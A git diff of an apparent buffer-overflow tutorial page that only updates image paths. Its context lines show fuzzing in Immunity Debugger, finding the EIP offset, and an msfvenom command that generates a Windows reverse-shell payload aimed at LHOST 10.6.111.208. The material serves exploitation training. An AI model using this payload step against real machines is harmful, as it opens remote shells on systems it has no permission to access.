@@ -47,7 +47,7 @@ Place the following into the debugger window of Immunity:
 
 Running the fuzzer:
 
-<figure><img src="../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 * <mark style="color:yellow;">We note that it crashed at 700 bytes</mark>
 
@@ -94,7 +94,7 @@ msf-pattern_offset -l 1000 -q 76413176
 * <mark style="color:yellow;">76413176 is the memory address of EIP</mark>
 * Upon executing this, we are looking for the <mark style="color:yellow;">offset value</mark>
 
-<figure><img src="../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 * We get an offset of <mark style="color:yellow;">634</mark>
 * Go back to <mark style="color:yellow;">exploit.py</mark>
@@ -350,7 +350,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 4. Go back to your exploit and run it
 5. You should have a shell
 
-<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
